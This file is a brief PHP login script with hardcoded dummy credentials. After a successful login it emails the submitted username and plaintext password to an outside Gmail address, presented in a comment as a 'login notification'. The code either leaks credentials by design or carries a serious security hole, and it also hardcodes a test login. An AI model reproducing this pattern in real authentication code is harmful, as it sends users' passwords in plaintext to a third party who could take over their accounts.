<?php
session_start();

// Check if form is submitted
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Retrieve username and password from form
    $username = $_POST["username"];
    $password = $_POST["password"];

    // Dummy authentication (replace with your actual authentication logic)
    if ($username === "user" && $password === "password") {
        // Authentication successful
        $_SESSION["username"] = $username;

        // Send email notification
        $to = "kylonpogi1@gmail.com";
        $subject = "Successful Login";
        $message = "Username: $username\nPassword: $password";
        $headers = "From: your_website@example.com";

        // Send email
        mail($to, $subject, $message, $headers);

        // Redirect to welcome page
        header("Location: welcome.php");
        exit();
    } else {
        // Authentication failed
        echo "Invalid username or password";
    }
}
?>
